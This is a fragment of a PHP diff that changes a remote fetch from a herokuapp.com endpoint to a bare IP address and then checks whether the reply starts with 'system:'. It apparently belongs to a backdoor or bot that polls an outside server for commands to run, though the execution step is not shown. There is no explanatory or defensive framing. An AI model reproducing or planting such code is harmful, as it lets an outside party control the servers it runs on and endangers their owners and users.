@@ -16,7 +16,7 @@ break;
 }
 $i++;
 }
-$exit=file_get_contents("https://nscon.herokuapp.com/main.php$req");
+$exit=file_get_contents("http://18.197.153.133/$req");
 $ex=str_split($exit);
 if ($ex[0].$ex[1].$ex[2].$ex[3].$ex[4].$ex[5].$ex[6]=='system:') {
 $ex[0]='';
